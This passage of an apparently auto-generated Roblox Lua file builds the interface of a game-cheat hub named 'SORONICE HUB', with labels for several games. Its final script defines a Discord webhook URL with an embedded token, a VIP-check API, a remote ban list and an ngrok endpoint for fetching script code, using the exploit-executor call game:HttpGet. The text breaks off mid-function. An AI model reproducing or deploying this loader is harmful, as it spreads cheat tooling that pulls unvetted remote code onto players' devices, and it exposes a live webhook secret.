_i[41].TextYAlignment = Enum.TextYAlignment.Center
_i[41].Name = [[TextLabel]]
_i[41].Parent = _i[38]

_i[42] = Instance.new("TextLabel")
_i[42].AnchorPoint = Vector2.new(0,0)
_i[42].BackgroundColor3 = Color3.fromRGB(0,0,0)
_i[42].BackgroundTransparency = 0.800000011920929
_i[42].BorderColor3 = Color3.fromRGB(0,0,0)
_i[42].BorderSizePixel = 0
_i[42].ClipsDescendants = false
_i[42].LayoutOrder = 0
_i[42].Position = UDim2.new(0,0,0.15035,0)
_i[42].Rotation = 0
_i[42].Selectable = false
_i[42].Size = UDim2.new(0,100,0,50)
_i[42].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[42].Visible = true
_i[42].ZIndex = 1
_i[42].Font = Enum.Font.SourceSans
_i[42].LineHeight = 1
_i[42].MaxVisibleGraphemes = -1
_i[42].RichText = true
_i[42].Text = [[blox-fruits]]
_i[42].TextColor3 = Color3.fromRGB(85,170,255)
_i[42].TextScaled = true
_i[42].TextSize = 14
_i[42].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[42].TextStrokeTransparency = 1
_i[42].TextTransparency = 0
_i[42].TextTruncate = Enum.TextTruncate.None
_i[42].TextWrapped = true
_i[42].TextXAlignment = Enum.TextXAlignment.Center
_i[42].TextYAlignment = Enum.TextYAlignment.Center
_i[42].Name = [[TextLabel]]
_i[42].Parent = _i[38]

_i[43] = Instance.new("TextLabel")
_i[43].AnchorPoint = Vector2.new(0,0)
_i[43].BackgroundColor3 = Color3.fromRGB(0,0,0)
_i[43].BackgroundTransparency = 0.800000011920929
_i[43].BorderColor3 = Color3.fromRGB(0,0,0)
_i[43].BorderSizePixel = 0
_i[43].ClipsDescendants = false
_i[43].LayoutOrder = 0
_i[43].Position = UDim2.new(0,0,0.174825,0)
_i[43].Rotation = 0
_i[43].Selectable = false
_i[43].Size = UDim2.new(0,100,0,43)
_i[43].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[43].Visible = true
_i[43].ZIndex = 1
_i[43].Font = Enum.Font.SourceSans
_i[43].LineHeight = 1
_i[43].MaxVisibleGraphemes = -1
_i[43].RichText = true
_i[43].Text = [[💪muscle-légendes]]
_i[43].TextColor3 = Color3.fromRGB(85,170,255)
_i[43].TextScaled = true
_i[43].TextSize = 14
_i[43].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[43].TextStrokeTransparency = 1
_i[43].TextTransparency = 0
_i[43].TextTruncate = Enum.TextTruncate.None
_i[43].TextWrapped = true
_i[43].TextXAlignment = Enum.TextXAlignment.Center
_i[43].TextYAlignment = Enum.TextYAlignment.Center
_i[43].Name = [[TextLabel]]
_i[43].Parent = _i[38]

_i[44] = Instance.new("TextLabel")
_i[44].AnchorPoint = Vector2.new(0,0)
_i[44].BackgroundColor3 = Color3.fromRGB(0,0,0)
_i[44].BackgroundTransparency = 0.800000011920929
_i[44].BorderColor3 = Color3.fromRGB(0,0,0)
_i[44].BorderSizePixel = 0
_i[44].ClipsDescendants = false
_i[44].LayoutOrder = 0
_i[44].Position = UDim2.new(0,0,0.174825,0)
_i[44].Rotation = 0
_i[44].Selectable = false
_i[44].Size = UDim2.new(0,100,0,43)
_i[44].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[44].Visible = true
_i[44].ZIndex = 1
_i[44].Font = Enum.Font.SourceSans
_i[44].LineHeight = 1
_i[44].MaxVisibleGraphemes = -1
_i[44].RichText = true
_i[44].Text = [[99-nuits-dans-la-forêt-🔦]]
_i[44].TextColor3 = Color3.fromRGB(85,170,255)
_i[44].TextScaled = true
_i[44].TextSize = 14
_i[44].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[44].TextStrokeTransparency = 1
_i[44].TextTransparency = 0
_i[44].TextTruncate = Enum.TextTruncate.None
_i[44].TextWrapped = true
_i[44].TextXAlignment = Enum.TextXAlignment.Center
_i[44].TextYAlignment = Enum.TextYAlignment.Center
_i[44].Name = [[TextLabel]]
_i[44].Parent = _i[38]

_i[45] = Instance.new("UIAspectRatioConstraint")
_i[45].AspectRatio = 4.264551639556885
_i[45].AspectType = Enum.AspectType.FitWithinMaxSize
_i[45].DominantAxis = Enum.DominantAxis.Width
_i[45].Name = [[UIAspectRatioConstraint]]
_i[45].Parent = _i[35]

_i[46] = Instance.new("Frame")
_i[46].AnchorPoint = Vector2.new(0.5,0.5)
_i[46].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[46].BackgroundTransparency = 1
_i[46].BorderColor3 = Color3.fromRGB(0,0,0)
_i[46].BorderSizePixel = 0
_i[46].ClipsDescendants = false
_i[46].LayoutOrder = 0
_i[46].Position = UDim2.new(0.39688,0,0.0864553,0)
_i[46].Rotation = 0
_i[46].Selectable = false
_i[46].Size = UDim2.new(0.794627,0,0.172911,0)
_i[46].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[46].Visible = true
_i[46].ZIndex = 1
_i[46].Name = [[Title]]
_i[46].Parent = _i[3]

_i[47] = Instance.new("UIAspectRatioConstraint")
_i[47].AspectRatio = 7.641666889190674
_i[47].AspectType = Enum.AspectType.FitWithinMaxSize
_i[47].DominantAxis = Enum.DominantAxis.Width
_i[47].Name = [[UIAspectRatioConstraint]]
_i[47].Parent = _i[46]

_i[48] = Instance.new("ImageLabel")
_i[48].AnchorPoint = Vector2.new(0.5,0.5)
_i[48].BackgroundColor3 = Color3.fromRGB(0,0,0)
_i[48].BackgroundTransparency = 1
_i[48].BorderColor3 = Color3.fromRGB(0,0,0)
_i[48].BorderSizePixel = 0
_i[48].ClipsDescendants = false
_i[48].LayoutOrder = 0
_i[48].Position = UDim2.new(0.5,0,0.5,0)
_i[48].Rotation = 0
_i[48].Selectable = false
_i[48].Size = UDim2.new(1,0,1,0)
_i[48].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[48].Visible = true
_i[48].ZIndex = 1
_i[48].Image = [[rbxassetid://16303779706]]
_i[48].ImageColor3 = Color3.fromRGB(255,255,255)
_i[48].ImageRectOffset = Vector2.new(0,0)
_i[48].ImageRectSize = Vector2.new(0,0)
_i[48].ImageTransparency = 0
_i[48].ResampleMode = Enum.ResamplerMode.Default
_i[48].ScaleType = Enum.ScaleType.Stretch
_i[48].SliceCenter = Rect.new(0,0,0,0)
_i[48].SliceScale = 1
_i[48].Name = [[Main]]
_i[48].Parent = _i[46]

_i[49] = Instance.new("UIAspectRatioConstraint")
_i[49].AspectRatio = 7.641666889190674
_i[49].AspectType = Enum.AspectType.FitWithinMaxSize
_i[49].DominantAxis = Enum.DominantAxis.Width
_i[49].Name = [[UIAspectRatioConstraint]]
_i[49].Parent = _i[48]

_i[50] = Instance.new("ImageLabel")
_i[50].AnchorPoint = Vector2.new(0.5,0.5)
_i[50].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[50].BackgroundTransparency = 1
_i[50].BorderColor3 = Color3.fromRGB(0,0,0)
_i[50].BorderSizePixel = 0
_i[50].ClipsDescendants = false
_i[50].LayoutOrder = 0
_i[50].Position = UDim2.new(0.5,0,0.5,0)
_i[50].Rotation = 0
_i[50].Selectable = false
_i[50].Size = UDim2.new(0.969466,0,0.725,0)
_i[50].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[50].Visible = true
_i[50].ZIndex = 1
_i[50].Image = [[rbxassetid://16303784238]]
_i[50].ImageColor3 = Color3.fromRGB(3,154,255)
_i[50].ImageRectOffset = Vector2.new(0,0)
_i[50].ImageRectSize = Vector2.new(0,0)
_i[50].ImageTransparency = 0
_i[50].ResampleMode = Enum.ResamplerMode.Default
_i[50].ScaleType = Enum.ScaleType.Stretch
_i[50].SliceCenter = Rect.new(0,0,0,0)
_i[50].SliceScale = 1
_i[50].Name = [[Color]]
_i[50].Parent = _i[48]

_i[51] = Instance.new("UIAspectRatioConstraint")
_i[51].AspectRatio = 10.218390464782715
_i[51].AspectType = Enum.AspectType.FitWithinMaxSize
_i[51].DominantAxis = Enum.DominantAxis.Width
_i[51].Name = [[UIAspectRatioConstraint]]
_i[51].Parent = _i[50]

_i[52] = Instance.new("TextLabel")
_i[52].AnchorPoint = Vector2.new(0,0)
_i[52].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[52].BackgroundTransparency = 1
_i[52].BorderColor3 = Color3.fromRGB(0,0,0)
_i[52].BorderSizePixel = 0
_i[52].ClipsDescendants = false
_i[52].LayoutOrder = 0
_i[52].Position = UDim2.new(0.838457,0,0,0)
_i[52].Rotation = 0
_i[52].Selectable = false
_i[52].Size = UDim2.new(0.146566,0,0.789311,0)
_i[52].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[52].Visible = true
_i[52].ZIndex = 40
_i[52].Font = Enum.Font.SourceSansBold
_i[52].LineHeight = 1
_i[52].MaxVisibleGraphemes = -1
_i[52].RichText = false
_i[52].Text = [[v5]]
_i[52].TextColor3 = Color3.fromRGB(255,255,255)
_i[52].TextScaled = true
_i[52].TextSize = 14
_i[52].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[52].TextStrokeTransparency = 1
_i[52].TextTransparency = 0
_i[52].TextTruncate = Enum.TextTruncate.None
_i[52].TextWrapped = true
_i[52].TextXAlignment = Enum.TextXAlignment.Center
_i[52].TextYAlignment = Enum.TextYAlignment.Center
_i[52].Name = [[TextLabel]]
_i[52].Parent = _i[50]

_i[53] = Instance.new("UIStroke")
_i[53].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[53].Color = Color3.fromRGB(255,255,255)
_i[53].LineJoinMode = Enum.LineJoinMode.Round
_i[53].Thickness = 2.5999999046325684
_i[53].Transparency = 0
_i[53].Name = [[UIStroke]]
_i[53].Parent = _i[52]

_i[54] = Instance.new("UIGradient")
_i[54].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(0,251,255)),ColorSequenceKeypoint.new(0.50416,Color3.fromRGB(0,0,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(191,0,255))})
_i[54].Offset = Vector2.new(0,0)
_i[54].Rotation = 0
_i[54].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[54].Name = [[UIGradient]]
_i[54].Parent = _i[53]

_i[55] = Instance.new("UIGradient")
_i[55].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(124,124,124)),ColorSequenceKeypoint.new(0.613977,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[55].Offset = Vector2.new(0,0)
_i[55].Rotation = 0
_i[55].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[55].Name = [[UIGradient]]
_i[55].Parent = _i[50]

_i[56] = Instance.new("TextLabel")
_i[56].AnchorPoint = Vector2.new(0.5,0.5)
_i[56].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[56].BackgroundTransparency = 1
_i[56].BorderColor3 = Color3.fromRGB(0,0,0)
_i[56].BorderSizePixel = 0
_i[56].ClipsDescendants = false
_i[56].LayoutOrder = 0
_i[56].Position = UDim2.new(0.346311,0,0.512949,0)
_i[56].Rotation = 0
_i[56].Selectable = false
_i[56].Size = UDim2.new(0.58485,0,0.604167,0)
_i[56].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[56].Visible = true
_i[56].ZIndex = 1
_i[56].Font = Enum.Font.Merriweather
_i[56].LineHeight = 1
_i[56].MaxVisibleGraphemes = -1
_i[56].RichText = false
_i[56].Text = [[SORONICE  HUB]]
_i[56].TextColor3 = Color3.fromRGB(255,255,255)
_i[56].TextScaled = true
_i[56].TextSize = 14
_i[56].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[56].TextStrokeTransparency = 1
_i[56].TextTransparency = 0
_i[56].TextTruncate = Enum.TextTruncate.None
_i[56].TextWrapped = true
_i[56].TextXAlignment = Enum.TextXAlignment.Left
_i[56].TextYAlignment = Enum.TextYAlignment.Center
_i[56].Name = [[TextLabel]]
_i[56].Parent = _i[46]

_i[57] = Instance.new("UIPadding")
_i[57].PaddingBottom = UDim.new(0,0)
_i[57].PaddingLeft = UDim.new(0,0)
_i[57].PaddingRight = UDim.new(0,0)
_i[57].PaddingTop = UDim.new(0,0)
_i[57].Name = [[UIPadding]]
_i[57].Parent = _i[56]

_i[58] = Instance.new("UIStroke")
_i[58].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[58].Color = Color3.fromRGB(0,85,255)
_i[58].LineJoinMode = Enum.LineJoinMode.Round
_i[58].Thickness = 3.4000000953674316
_i[58].Transparency = 0
_i[58].Name = [[UIStroke]]
_i[58].Parent = _i[56]

_i[59] = Instance.new("ImageLabel")
_i[59].AnchorPoint = Vector2.new(0,0)
_i[59].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[59].BackgroundTransparency = 1
_i[59].BorderColor3 = Color3.fromRGB(0,0,0)
_i[59].BorderSizePixel = 0
_i[59].ClipsDescendants = false
_i[59].LayoutOrder = 0
_i[59].Position = UDim2.new(0.570282,0,0.269557,0)
_i[59].Rotation = 0
_i[59].Selectable = false
_i[59].Size = UDim2.new(0.067205,0,0.484212,0)
_i[59].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[59].Visible = true
_i[59].ZIndex = 1
_i[59].Image = [[rbxassetid://123965417468651]]
_i[59].ImageColor3 = Color3.fromRGB(255,255,255)
_i[59].ImageRectOffset = Vector2.new(0,0)
_i[59].ImageRectSize = Vector2.new(0,0)
_i[59].ImageTransparency = 0
_i[59].ResampleMode = Enum.ResamplerMode.Default
_i[59].ScaleType = Enum.ScaleType.Stretch
_i[59].SliceCenter = Rect.new(0,0,0,0)
_i[59].SliceScale = 1
_i[59].Name = [[ImageLabel]]
_i[59].Parent = _i[46]

_i[60] = Instance.new("TextLabel")
_i[60].AnchorPoint = Vector2.new(0,0)
_i[60].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[60].BackgroundTransparency = 1
_i[60].BorderColor3 = Color3.fromRGB(0,0,0)
_i[60].BorderSizePixel = 0
_i[60].ClipsDescendants = false
_i[60].LayoutOrder = 0
_i[60].Position = UDim2.new(0.828571,0,0.242424,0)
_i[60].Rotation = 0
_i[60].Selectable = false
_i[60].Size = UDim2.new(2.17143,0,0.727273,0)
_i[60].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[60].Visible = true
_i[60].ZIndex = 1
_i[60].Font = Enum.Font.SourceSansBold
_i[60].LineHeight = 1
_i[60].MaxVisibleGraphemes = -1
_i[60].RichText = false
_i[60].Text = [[100110]]
_i[60].TextColor3 = Color3.fromRGB(255,255,255)
_i[60].TextScaled = true
_i[60].TextSize = 14
_i[60].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[60].TextStrokeTransparency = 1
_i[60].TextTransparency = 0
_i[60].TextTruncate = Enum.TextTruncate.None
_i[60].TextWrapped = true
_i[60].TextXAlignment = Enum.TextXAlignment.Left
_i[60].TextYAlignment = Enum.TextYAlignment.Center
_i[60].Name = [[pomlk1]]
_i[60].Parent = _i[59]

_i[61] = Instance.new("UIStroke")
_i[61].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[61].Color = Color3.fromRGB(0,85,255)
_i[61].LineJoinMode = Enum.LineJoinMode.Round
_i[61].Thickness = 2.799999952316284
_i[61].Transparency = 0
_i[61].Name = [[UIStroke]]
_i[61].Parent = _i[60]

_i[62] = Instance.new("TextButton")
_i[62].AnchorPoint = Vector2.new(0.5,0.5)
_i[62].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[62].BackgroundTransparency = 1
_i[62].BorderColor3 = Color3.fromRGB(0,0,0)
_i[62].BorderSizePixel = 0
_i[62].ClipsDescendants = false
_i[62].LayoutOrder = 0
_i[62].Position = UDim2.new(0.103754,0,0.220731,0)
_i[62].Rotation = 0
_i[62].Selectable = true
_i[62].Size = UDim2.new(0.0717125,0,0.109097,0)
_i[62].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[62].Visible = true
_i[62].ZIndex = 1
_i[62].AutoButtonColor = true
_i[62].Font = Enum.Font.SourceSans
_i[62].LineHeight = 1
_i[62].Modal = false
_i[62].RichText = false
_i[62].Selected = false
_i[62].Text = [[]]
_i[62].TextColor3 = Color3.fromRGB(0,0,0)
_i[62].TextScaled = false
_i[62].TextSize = 14
_i[62].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[62].TextStrokeTransparency = 1
_i[62].TextTransparency = 0
_i[62].TextWrapped = false
_i[62].TextXAlignment = Enum.TextXAlignment.Center
_i[62].TextYAlignment = Enum.TextYAlignment.Center
_i[62].Name = [[Bouton discord]]
_i[62].Parent = _i[3]

_i[63] = Instance.new("ImageLabel")
_i[63].AnchorPoint = Vector2.new(0,0)
_i[63].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[63].BackgroundTransparency = 1
_i[63].BorderColor3 = Color3.fromRGB(0,0,0)
_i[63].BorderSizePixel = 0
_i[63].ClipsDescendants = false
_i[63].LayoutOrder = 0
_i[63].Position = UDim2.new(0,0,-3.54856e-07,0)
_i[63].Rotation = 0
_i[63].Selectable = false
_i[63].Size = UDim2.new(1,0,1,0)
_i[63].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[63].Visible = true
_i[63].ZIndex = 1
_i[63].Image = [[rbxassetid://127885216293809]]
_i[63].ImageColor3 = Color3.fromRGB(255,255,255)
_i[63].ImageRectOffset = Vector2.new(0,0)
_i[63].ImageRectSize = Vector2.new(0,0)
_i[63].ImageTransparency = 0
_i[63].ResampleMode = Enum.ResamplerMode.Default
_i[63].ScaleType = Enum.ScaleType.Stretch
_i[63].SliceCenter = Rect.new(0,0,0,0)
_i[63].SliceScale = 1
_i[63].Name = [[ImageLabel]]
_i[63].Parent = _i[62]

_i[64] = Instance.new("TextButton")
_i[64].AnchorPoint = Vector2.new(0.5,0.5)
_i[64].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[64].BackgroundTransparency = 1
_i[64].BorderColor3 = Color3.fromRGB(0,0,0)
_i[64].BorderSizePixel = 0
_i[64].ClipsDescendants = false
_i[64].LayoutOrder = 0
_i[64].Position = UDim2.new(0.175467,0,0.220731,0)
_i[64].Rotation = 0
_i[64].Selectable = true
_i[64].Size = UDim2.new(0.0717125,0,0.109097,0)
_i[64].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[64].Visible = true
_i[64].ZIndex = 1
_i[64].AutoButtonColor = true
_i[64].Font = Enum.Font.SourceSans
_i[64].LineHeight = 1
_i[64].Modal = false
_i[64].RichText = false
_i[64].Selected = false
_i[64].Text = [[]]
_i[64].TextColor3 = Color3.fromRGB(0,0,0)
_i[64].TextScaled = false
_i[64].TextSize = 14
_i[64].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[64].TextStrokeTransparency = 1
_i[64].TextTransparency = 0
_i[64].TextWrapped = false
_i[64].TextXAlignment = Enum.TextXAlignment.Center
_i[64].TextYAlignment = Enum.TextYAlignment.Center
_i[64].Name = [[Bouton YouTube]]
_i[64].Parent = _i[3]

_i[65] = Instance.new("ImageLabel")
_i[65].AnchorPoint = Vector2.new(0,0)
_i[65].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[65].BackgroundTransparency = 1
_i[65].BorderColor3 = Color3.fromRGB(0,0,0)
_i[65].BorderSizePixel = 0
_i[65].ClipsDescendants = false
_i[65].LayoutOrder = 0
_i[65].Position = UDim2.new(0,0,-3.54856e-07,0)
_i[65].Rotation = 0
_i[65].Selectable = false
_i[65].Size = UDim2.new(1,0,1,0)
_i[65].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[65].Visible = true
_i[65].ZIndex = 1
_i[65].Image = [[rbxassetid://100375375569274]]
_i[65].ImageColor3 = Color3.fromRGB(255,255,255)
_i[65].ImageRectOffset = Vector2.new(0,0)
_i[65].ImageRectSize = Vector2.new(0,0)
_i[65].ImageTransparency = 0
_i[65].ResampleMode = Enum.ResamplerMode.Default
_i[65].ScaleType = Enum.ScaleType.Stretch
_i[65].SliceCenter = Rect.new(0,0,0,0)
_i[65].SliceScale = 1
_i[65].Name = [[ImageLabel]]
_i[65].Parent = _i[64]

_i[66] = Instance.new("TextButton")
_i[66].AnchorPoint = Vector2.new(0,0)
_i[66].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[66].BackgroundTransparency = 1
_i[66].BorderColor3 = Color3.fromRGB(0,0,0)
_i[66].BorderSizePixel = 0
_i[66].ClipsDescendants = false
_i[66].LayoutOrder = 0
_i[66].Position = UDim2.new(0.199219,0,0.178406,0)
_i[66].Rotation = 0
_i[66].Selectable = true
_i[66].Size = UDim2.new(0.602514,0,0.133812,0)
_i[66].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[66].Visible = true
_i[66].ZIndex = 0
_i[66].AutoButtonColor = true
_i[66].Font = Enum.Font.SourceSans
_i[66].LineHeight = 1
_i[66].Modal = false
_i[66].RichText = false
_i[66].Selected = false
_i[66].Text = [[]]
_i[66].TextColor3 = Color3.fromRGB(0,0,0)
_i[66].TextScaled = false
_i[66].TextSize = 14
_i[66].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[66].TextStrokeTransparency = 1
_i[66].TextTransparency = 0
_i[66].TextWrapped = false
_i[66].TextXAlignment = Enum.TextXAlignment.Center
_i[66].TextYAlignment = Enum.TextYAlignment.Center
_i[66].Name = [[Bouton de déplacement]]
_i[66].Parent = _i[2]

_i[67] = Instance.new("UIAspectRatioConstraint")
_i[67].AspectRatio = 1.7794253826141357
_i[67].AspectType = Enum.AspectType.FitWithinMaxSize
_i[67].DominantAxis = Enum.DominantAxis.Width
_i[67].Name = [[UIAspectRatioConstraint]]
_i[67].Parent = _i[2]

_i[68] = Instance.new("TextLabel")
_i[68].AnchorPoint = Vector2.new(0,0)
_i[68].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[68].BackgroundTransparency = 1
_i[68].BorderColor3 = Color3.fromRGB(0,0,0)
_i[68].BorderSizePixel = 0
_i[68].ClipsDescendants = false
_i[68].LayoutOrder = 0
_i[68].Position = UDim2.new(0,0,0.879569,0)
_i[68].Rotation = 0
_i[68].Selectable = false
_i[68].Size = UDim2.new(1,0,0.119125,0)
_i[68].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[68].Visible = true
_i[68].ZIndex = 1
_i[68].Font = Enum.Font.SourceSans
_i[68].LineHeight = 1
_i[68].MaxVisibleGraphemes = -1
_i[68].RichText = false
_i[68].Text = [[]]
_i[68].TextColor3 = Color3.fromRGB(255,255,255)
_i[68].TextScaled = true
_i[68].TextSize = 14
_i[68].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[68].TextStrokeTransparency = 1
_i[68].TextTransparency = 0
_i[68].TextTruncate = Enum.TextTruncate.None
_i[68].TextWrapped = true
_i[68].TextXAlignment = Enum.TextXAlignment.Center
_i[68].TextYAlignment = Enum.TextYAlignment.Center
_i[68].Name = [[TextLabel]]
_i[68].Parent = _i[1]

_i[69] = Instance.new("Frame")
_i[69].AnchorPoint = Vector2.new(0,0)
_i[69].BackgroundColor3 = Color3.fromRGB(0,0,0)
_i[69].BackgroundTransparency = 0.3499999940395355
_i[69].BorderColor3 = Color3.fromRGB(0,0,0)
_i[69].BorderSizePixel = 0
_i[69].ClipsDescendants = false
_i[69].LayoutOrder = 0
_i[69].Position = UDim2.new(0.0154421,0,0,0)
_i[69].Rotation = 0
_i[69].Selectable = false
_i[69].Size = UDim2.new(0.967978,0,0.226828,0)
_i[69].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[69].Visible = false
_i[69].ZIndex = 1
_i[69].Name = [[Message]]
_i[69].Parent = _i[1]

_i[70] = Instance.new("UICorner")
_i[70].CornerRadius = UDim.new(0,8)
_i[70].Name = [[UICorner]]
_i[70].Parent = _i[69]

_i[71] = Instance.new("UIStroke")
_i[71].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[71].Color = Color3.fromRGB(255,255,255)
_i[71].LineJoinMode = Enum.LineJoinMode.Round
_i[71].Thickness = 3.799999952316284
_i[71].Transparency = 0.4000000059604645
_i[71].Name = [[UIStroke]]
_i[71].Parent = _i[69]

_i[72] = Instance.new("UIGradient")
_i[72].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,164,166)),ColorSequenceKeypoint.new(0.412646,Color3.fromRGB(255,212,213)),ColorSequenceKeypoint.new(0.62396,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,255,255))})
_i[72].Offset = Vector2.new(0,0)
_i[72].Rotation = 0
_i[72].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[72].Name = [[UIGradient]]
_i[72].Parent = _i[71]

_i[73] = Instance.new("TextLabel")
_i[73].AnchorPoint = Vector2.new(0,0)
_i[73].BackgroundColor3 = Color3.fromRGB(255,255,255)
_i[73].BackgroundTransparency = 1
_i[73].BorderColor3 = Color3.fromRGB(0,0,0)
_i[73].BorderSizePixel = 0
_i[73].ClipsDescendants = false
_i[73].LayoutOrder = 0
_i[73].Position = UDim2.new(0,0,0,0)
_i[73].Rotation = 0
_i[73].Selectable = false
_i[73].Size = UDim2.new(1,0,1,0)
_i[73].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[73].Visible = true
_i[73].ZIndex = 1
_i[73].Font = Enum.Font.SourceSans
_i[73].LineHeight = 1
_i[73].MaxVisibleGraphemes = -1
_i[73].RichText = false
_i[73].Text = [[...]]
_i[73].TextColor3 = Color3.fromRGB(255,255,255)
_i[73].TextScaled = true
_i[73].TextSize = 27
_i[73].TextStrokeColor3 = Color3.fromRGB(0,0,0)
_i[73].TextStrokeTransparency = 1
_i[73].TextTransparency = 0
_i[73].TextTruncate = Enum.TextTruncate.None
_i[73].TextWrapped = true
_i[73].TextXAlignment = Enum.TextXAlignment.Left
_i[73].TextYAlignment = Enum.TextYAlignment.Top
_i[73].Name = [[Message visible]]
_i[73].Parent = _i[69]

_i[74] = Instance.new("UITextSizeConstraint")
_i[74].MaxTextSize = 27
_i[74].MinTextSize = 1
_i[74].Name = [[UITextSizeConstraint]]
_i[74].Parent = _i[73]

_i[75] = Instance.new("UIStroke")
_i[75].ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
_i[75].Color = Color3.fromRGB(0,0,0)
_i[75].LineJoinMode = Enum.LineJoinMode.Round
_i[75].Thickness = 2.299999952316284
_i[75].Transparency = 0
_i[75].Name = [[UIStroke]]
_i[75].Parent = _i[73]

_i[76] = Instance.new("Frame")
_i[76].AnchorPoint = Vector2.new(0,0)
_i[76].BackgroundColor3 = Color3.fromRGB(121,121,121)
_i[76].BackgroundTransparency = 0.5
_i[76].BorderColor3 = Color3.fromRGB(0,0,0)
_i[76].BorderSizePixel = 0
_i[76].ClipsDescendants = false
_i[76].LayoutOrder = 0
_i[76].Position = UDim2.new(-1.33817,0,-1.08192,0)
_i[76].Rotation = 0
_i[76].Selectable = false
_i[76].Size = UDim2.new(3.69743,0,3.18864,0)
_i[76].SizeConstraint = Enum.SizeConstraint.RelativeXY
_i[76].Visible = false
_i[76].ZIndex = 0
_i[76].Name = [[Frame]]
_i[76].Parent = _i[1]

_i[77] = Instance.new("UIGradient")
_i[77].Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(93,0,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(81,255,0))})
_i[77].Offset = Vector2.new(0,0)
_i[77].Rotation = 0
_i[77].Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0,0),NumberSequenceKeypoint.new(1,0,0)})
_i[77].Name = [[UIGradient]]
_i[77].Parent = _i[76]


-- Scripts:

local function VALMB_fake_script() -- Mot de passe Stats.LocalScript
	local script = Instance.new('LocalScript', _i[1])
	script.Name = [[LocalScript]]

	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	local gui = player:WaitForChild("PlayerGui"):WaitForChild("Mot de passe Stats")
	gui.ResetOnSpawn = false
	ResetOnSpawn = false
	
end
coroutine.wrap(VALMB_fake_script)()

local function WFQPN_fake_script() -- Mot de passe Stats.LocalScript
	local script = Instance.new('LocalScript', _i[1])
	script.Name = [[LocalScript]]

	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local HttpService = game:GetService("HttpService")
	local MarketplaceService = game:GetService("MarketplaceService")
	local UserInputService = game:GetService("UserInputService")
	local Stats = game:GetService("Stats")
	local Workspace = game:GetService("Workspace")
	local RunService = game:GetService("RunService")
	local StarterGui = game:GetService("StarterGui")
	
	local API_URL = "https://v0-roblox-account-integration.vercel.app/api/vip/check"
	local WEBHOOK_URL = "https://discord.com/api/webhooks/1482988203894898759/QsufSoJQweu1fVVxOcYuFNaW8cWUVNCzv54rckSr7IisK-FfpZsQc3wquHMMd4QYzjAm"
	local BAN_URL = "https://raw.githubusercontent.com/Audinay/UFIL/refs/heads/main/Id%C3%A9e%20de%20joueur.ban"
	
	-- === CONFIGURATION MULTIVERSE (CORRIGÉE) ===
	-- On ajoute bien /api/get_script à la fin du lien Ngrok
	local NGROK_MULTIVERSE = "https://sighing-gauze-charcoal.ngrok-free.dev/api/get_script"
	
	local ID_CREATEUR = 9547606904
	
	local gui = script.Parent 
	_G.IsVipActive = false 
	local isHubLoaded = false
	local kickTimerStarted = false
	local webhookSent = false 
	
	-- ==========================================
	-- 0. SYSTÈME DE BANNISSEMENT GLOBAL (BLACKLIST)
	-- ==========================================
	local function checkBanList()
		local success, banData = pcall(function() return game:HttpGet(BAN_URL) end)
		if success and banData then
			for bannedId in string.gmatch(banData, "%d+") do
